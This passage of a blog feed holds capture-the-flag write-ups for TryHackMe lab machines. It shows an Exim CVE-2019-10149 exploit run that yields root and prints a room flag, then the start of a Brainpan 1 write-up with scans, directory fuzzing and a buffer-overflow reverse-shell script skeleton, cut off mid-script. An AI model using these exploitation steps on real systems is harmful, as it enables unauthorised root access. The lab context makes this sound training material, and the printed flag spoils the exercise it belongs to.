&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">Authenticators&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="n">cram_md5&lt;/span> &lt;span class="n">plaintext&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">Routers&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="n">accept&lt;/span> &lt;span class="n">dnslookup&lt;/span> &lt;span class="n">ipliteral&lt;/span> &lt;span class="n">manualroute&lt;/span> &lt;span class="n">queryprogram&lt;/span> &lt;span class="n">redirect&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">Transports&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="n">appendfile&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">maildir&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">mailstore&lt;/span> &lt;span class="n">autoreply&lt;/span> &lt;span class="n">lmtp&lt;/span> &lt;span class="n">pipe&lt;/span> &lt;span class="n">smtp&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">Fixed&lt;/span> &lt;span class="n">never_users&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="mi">0&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">Configure&lt;/span> &lt;span class="n">owner&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">0&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">Size&lt;/span> &lt;span class="n">of&lt;/span> &lt;span class="n">off_t&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="mi">8&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">Configuration&lt;/span> &lt;span class="n">file&lt;/span> &lt;span class="n">is&lt;/span> &lt;span class="o">/&lt;/span>&lt;span class="k">var&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">lib&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">exim4&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">config&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">autogenerated&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>I found this exploit: https://raw.githubusercontent.com/AzizMea/CVE-2019-10149-privilege-escalation/master/wizard.py &lt;/p>
&lt;p>we can copy the script, change the port to the one that exim4 is running and execute it.&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">python wizard.py
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">220 at ESMTP Exim 4.90_1 Ubuntu Sun, 07 Jun 2020 19:12:08 +0200
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">250 at Hello localhost [127.0.0.1]
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">250 OK
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">250 Accepted
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">354 Enter message, ending with &amp;#34;.&amp;#34; on a line by itself
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">250 OK id=1jhyq8-0000r2-HW
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">whoami
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">root
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>So now we just want to find the last flag, which is in the bubblegum home.&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;span class="lnt">21
&lt;/span>&lt;span class="lnt">22
&lt;/span>&lt;span class="lnt">23
&lt;/span>&lt;span class="lnt">24
&lt;/span>&lt;span class="lnt">25
&lt;/span>&lt;span class="lnt">26
&lt;/span>&lt;span class="lnt">27
&lt;/span>&lt;span class="lnt">28
&lt;/span>&lt;span class="lnt">29
&lt;/span>&lt;span class="lnt">30
&lt;/span>&lt;span class="lnt">31
&lt;/span>&lt;span class="lnt">32
&lt;/span>&lt;span class="lnt">33
&lt;/span>&lt;span class="lnt">34
&lt;/span>&lt;span class="lnt">35
&lt;/span>&lt;span class="lnt">36
&lt;/span>&lt;span class="lnt">37
&lt;/span>&lt;span class="lnt">38
&lt;/span>&lt;span class="lnt">39
&lt;/span>&lt;span class="lnt">40
&lt;/span>&lt;span class="lnt">41
&lt;/span>&lt;span class="lnt">42
&lt;/span>&lt;span class="lnt">43
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">cat bmo.txt
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">░░░░▄██████████████████████▄░░░░
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">░░░░█░░░░░░░░░░░░░░░░░░░░░░█░░░░
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">░░░░█░▄██████████████████▄░█░░░░
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">░░░░█░█░░░░░░░░░░░░░░░░░░█░█░░░░
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">░░░░█░█░░░░░░░░░░░░░░░░░░█░█░░░░
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">░░░░█░█░░█░░░░░░░░░░░░█░░█░█░░░░
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">░░░░█░█░░░░░▄▄▄▄▄▄▄▄░░░░░█░█░░░░
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">░░░░█░█░░░░░▀▄░░░░▄▀░░░░░█░█░░░░
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">░░░░█░█░░░░░░░▀▀▀▀░░░░░░░█░█░░░░
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">░░░░█░█░░░░░░░░░░░░░░░░░░█░█░░░░
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">░█▌░█░▀██████████████████▀░█░▐█░
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">░█░░█░░░░░░░░░░░░░░░░░░░░░░█░░█░
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">░█░░█░████████████░░░░░██░░█░░█░
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">░█░░█░░░░░░░░░░░░░░░░░░░░░░█░░█░
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">░█░░█░░░░░░░░░░░░░░░▄░░░░░░█░░█░
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">░▀█▄█░░░▐█▌░░░░░░░▄███▄░██░█▄█▀░
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">░░░▀█░░█████░░░░░░░░░░░░░░░█▀░░░
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">░░░░█░░░▐█▌░░░░░░░░░▄██▄░░░█░░░░
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">░░░░█░░░░░░░░░░░░░░▐████▌░░█░░░░
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">░░░░█░▄▄▄░▄▄▄░░░░░░░▀██▀░░░█░░░░
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">░░░░█░░░░░░░░░░░░░░░░░░░░░░█░░░░
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">░░░░▀██████████████████████▀░░░░
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">░░░░░░░░██░░░░░░░░░░░░██░░░░░░░░
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">░░░░░░░░██░░░░░░░░░░░░██░░░░░░░░
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">░░░░░░░░██░░░░░░░░░░░░██░░░░░░░░
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">░░░░░░░░██░░░░░░░░░░░░██░░░░░░░░
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">░░░░░░░▐██░░░░░░░░░░░░██▌░░░░░░░
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Secret project number: 211243A
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Name opbject: BMO
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Rol object: Spy
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">In case of emergency use resetcode: tryhackme{Th1s1s4c0d3F0rBM0}
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">-------
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Good job on getting this code!!!!
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">You solved all the puzzles and tried harder to the max.
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">If you liked this CTF, give a shout out to @n0w4n.
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div></description></item><item><title>Brainpan 1 Writeup THM</title><link>https://simonefelici.github.io/p/brainpan-1-writeup-thm/</link><pubDate>Thu, 04 Jan 2024 00:00:00 +0000</pubDate><guid>https://simonefelici.github.io/p/brainpan-1-writeup-thm/</guid><description>&lt;img src="https://raw.githubusercontent.com/Blueaulo/Brainpan1-writeup-THM/main/754f5e1d-ea90-41d9-9bdf-c35333bf9929_Export-364cf768-db35-42c3-9c8f-01faddec3169/Brainpan%201%20ad62754b337f4b43b8bb42d82d0a7e29/Untitled.png" alt="Featured image of post Brainpan 1 Writeup THM" />&lt;p>I am going to start with a nmap scan:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">nmap 10.10.143.30
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Starting Nmap 7.94SVN &lt;span class="o">(&lt;/span> https://nmap.org &lt;span class="o">)&lt;/span> at 2024-01-03 12:34 EST
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Nmap scan report &lt;span class="k">for&lt;/span> 10.10.143.30
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Host is up &lt;span class="o">(&lt;/span>0.058s latency&lt;span class="o">)&lt;/span>.
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Not shown: &lt;span class="m">998&lt;/span> closed tcp ports &lt;span class="o">(&lt;/span>conn-refused&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">PORT STATE SERVICE
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">9999/tcp open abyss
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">10000/tcp open snet-sensor-mgmt
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Nmap &lt;span class="k">done&lt;/span>: &lt;span class="m">1&lt;/span> IP address &lt;span class="o">(&lt;/span>&lt;span class="m">1&lt;/span> host up&lt;span class="o">)&lt;/span> scanned in 7.40 seconds
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">9999/tcp open abyss?
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">10000/tcp open http SimpleHTTPServer 0.6 &lt;span class="o">(&lt;/span>Python 2.7.3&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>Port 9999 contains the program:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">nc 10.10.143.30 &lt;span class="m">9999&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">_&lt;span class="p">|&lt;/span> _&lt;span class="p">|&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">_&lt;span class="p">|&lt;/span>_&lt;span class="p">|&lt;/span>_&lt;span class="p">|&lt;/span> _&lt;span class="p">|&lt;/span> _&lt;span class="p">|&lt;/span>_&lt;span class="p">|&lt;/span> _&lt;span class="p">|&lt;/span>_&lt;span class="p">|&lt;/span>_&lt;span class="p">|&lt;/span> _&lt;span class="p">|&lt;/span>_&lt;span class="p">|&lt;/span>_&lt;span class="p">|&lt;/span> _&lt;span class="p">|&lt;/span>_&lt;span class="p">|&lt;/span>_&lt;span class="p">|&lt;/span> _&lt;span class="p">|&lt;/span>_&lt;span class="p">|&lt;/span>_&lt;span class="p">|&lt;/span> _&lt;span class="p">|&lt;/span>_&lt;span class="p">|&lt;/span>_&lt;span class="p">|&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">_&lt;span class="p">|&lt;/span> _&lt;span class="p">|&lt;/span> _&lt;span class="p">|&lt;/span>_&lt;span class="p">|&lt;/span> _&lt;span class="p">|&lt;/span> _&lt;span class="p">|&lt;/span> _&lt;span class="p">|&lt;/span> _&lt;span class="p">|&lt;/span> _&lt;span class="p">|&lt;/span> _&lt;span class="p">|&lt;/span> _&lt;span class="p">|&lt;/span> _&lt;span class="p">|&lt;/span> _&lt;span class="p">|&lt;/span> _&lt;span class="p">|&lt;/span> _&lt;span class="p">|&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">_&lt;span class="p">|&lt;/span> _&lt;span class="p">|&lt;/span> _&lt;span class="p">|&lt;/span> _&lt;span class="p">|&lt;/span> _&lt;span class="p">|&lt;/span> _&lt;span class="p">|&lt;/span> _&lt;span class="p">|&lt;/span> _&lt;span class="p">|&lt;/span> _&lt;span class="p">|&lt;/span> _&lt;span class="p">|&lt;/span> _&lt;span class="p">|&lt;/span> _&lt;span class="p">|&lt;/span> _&lt;span class="p">|&lt;/span> _&lt;span class="p">|&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">_&lt;span class="p">|&lt;/span>_&lt;span class="p">|&lt;/span>_&lt;span class="p">|&lt;/span> _&lt;span class="p">|&lt;/span> _&lt;span class="p">|&lt;/span>_&lt;span class="p">|&lt;/span>_&lt;span class="p">|&lt;/span> _&lt;span class="p">|&lt;/span> _&lt;span class="p">|&lt;/span> _&lt;span class="p">|&lt;/span> _&lt;span class="p">|&lt;/span>_&lt;span class="p">|&lt;/span>_&lt;span class="p">|&lt;/span> _&lt;span class="p">|&lt;/span>_&lt;span class="p">|&lt;/span>_&lt;span class="p">|&lt;/span> _&lt;span class="p">|&lt;/span> _&lt;span class="p">|&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> _&lt;span class="p">|&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> _&lt;span class="p">|&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>________________________ WELCOME TO BRAINPAN _________________________&lt;span class="o">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> ENTER THE PASSWORD
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>And 10000 contains a http server:&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/Blueaulo/Brainpan1-writeup-THM/main/754f5e1d-ea90-41d9-9bdf-c35333bf9929_Export-364cf768-db35-42c3-9c8f-01faddec3169/Brainpan%201%20ad62754b337f4b43b8bb42d82d0a7e29/Untitled.png"
loading="lazy"
alt="Untitled"
>&lt;/p>
&lt;p>The site doesn’t tell us much, but I used ffuf for enumerating the subdirectories:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;span class="lnt">21
&lt;/span>&lt;span class="lnt">22
&lt;/span>&lt;span class="lnt">23
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">ffuf -u http://10.10.143.30:10000/FUZZ -w /usr/share/wordlists/dirb/big.txt
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> /&lt;span class="s1">&amp;#39;___\ /&amp;#39;&lt;/span>___&lt;span class="se">\ &lt;/span> /&lt;span class="err">&amp;#39;&lt;/span>___&lt;span class="se">\
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="se">&lt;/span> /&lt;span class="se">\ \_&lt;/span>_/ /&lt;span class="se">\ \_&lt;/span>_/ __ __ /&lt;span class="se">\ \_&lt;/span>_/
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="se">\ \ &lt;/span>,__&lt;span class="se">\\&lt;/span> &lt;span class="se">\ &lt;/span>,__&lt;span class="se">\/\ \/\ \ \ \ &lt;/span>,__&lt;span class="se">\
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="se">&lt;/span> &lt;span class="se">\ \ \_&lt;/span>/ &lt;span class="se">\ \ \_&lt;/span>/&lt;span class="se">\ \ \_\ \ \ \ \_&lt;/span>/
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="se">\ \_\ &lt;/span> &lt;span class="se">\ \_\ &lt;/span> &lt;span class="se">\ \_&lt;/span>___/ &lt;span class="se">\ \_\
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="se">&lt;/span> &lt;span class="se">\/&lt;/span>_/ &lt;span class="se">\/&lt;/span>_/ &lt;span class="se">\/&lt;/span>___/ &lt;span class="se">\/&lt;/span>_/
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> v2.1.0-dev
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">________________________________________________
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> :: Method : GET
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> :: URL : http://10.10.143.30:10000/FUZZ
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> :: Wordlist : FUZZ: /usr/share/wordlists/dirb/big.txt
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> :: Follow redirects : &lt;span class="nb">false&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> :: Calibration : &lt;span class="nb">false&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> :: Timeout : &lt;span class="m">10&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> :: Threads : &lt;span class="m">40&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> :: Matcher : Response status: 200-299,301,302,307,401,403,405,500
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">________________________________________________
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">bin &lt;span class="o">[&lt;/span>Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 65ms&lt;span class="o">]&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>He found the bin directory, which contains the exe!&lt;/p>
&lt;p>I moved the exe in my windows machine with Immunity Debugger and mona installed.&lt;/p>
&lt;p>And I started the server:&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/Blueaulo/Brainpan1-writeup-THM/main/754f5e1d-ea90-41d9-9bdf-c35333bf9929_Export-364cf768-db35-42c3-9c8f-01faddec3169/Brainpan%201%20ad62754b337f4b43b8bb42d82d0a7e29/Untitled%201.png"
loading="lazy"
alt="Untitled"
>&lt;/p>
&lt;p>I will use this code for getting a reverse shell:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;span class="lnt">21
&lt;/span>&lt;span class="lnt">22
&lt;/span>&lt;span class="lnt">23
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">import socket
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">ip&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s2">&amp;#34;10.10.6.37&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">port&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="m">9999&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">offset&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="m">0&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">overflow&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s2">&amp;#34;A&amp;#34;&lt;/span> * offset
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">retn&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s2">&amp;#34;&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">padding&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s2">&amp;#34;\x90&amp;#34;&lt;/span> * &lt;span class="m">16&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">payload&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s2">&amp;#34;&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">postfix&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s2">&amp;#34;&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">buffer&lt;/span> &lt;span class="o">=&lt;/span> overflow + retn + padding + payload + postfix
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">s&lt;/span> &lt;span class="o">=&lt;/span> socket.socket&lt;span class="o">(&lt;/span>socket.AF_INET, socket.SOCK_STREAM&lt;span class="o">)&lt;/span>
